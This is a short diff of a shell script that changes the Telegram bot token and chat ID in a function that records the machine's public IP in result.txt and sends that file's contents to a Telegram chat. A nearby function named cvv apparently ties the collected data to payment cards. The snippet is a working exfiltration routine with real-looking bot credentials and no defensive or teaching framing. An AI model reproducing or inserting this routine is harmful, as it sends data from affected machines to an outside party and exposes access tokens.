@@ -18,8 +18,8 @@ cvv(){
 
 tgbots(){
     echo "这台机器的IP是`curl ip.sb`" >> result.txt
-    TOKEN=5677739231:AAG6zUBUJg2AQL9lxplHQBba1V5dNnVZnq4	
-    chat_ID=5770708575		
+    TOKEN=6538396942:AAEjGtFy3lbGY6h7MKAfsNH0l_qjpaVOnYc	
+    chat_ID=1749475863		
     message_text=`cat result.txt`	
     MODE='HTML'
     URL="https://api.telegram.org/bot${TOKEN}/sendMessage"	
